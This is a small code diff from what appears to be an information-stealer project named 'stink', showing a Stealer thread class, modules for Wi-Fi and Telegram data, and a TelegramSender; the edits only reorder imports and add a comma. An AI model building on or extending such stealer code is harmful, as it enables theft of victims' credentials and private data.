@@ -1,4 +1,6 @@
+from getpass import getuser
 from multiprocessing import Pool
+from random import random
 from threading import Thread
 
 from stink.enums import Features
@@ -10,8 +12,6 @@ from stink.modules import (
     Wifi,
     TelegramSender,
 )
-from getpass import getuser
-from random import random
 
 
 class Stealer(Thread):
@@ -83,7 +83,7 @@ class Stealer(Thread):
             {
                 "object": Telegram,
                 "arguments": ("Programs/Telegram",),
-            }
+            },
         ]
 
     def run(self) -> None:
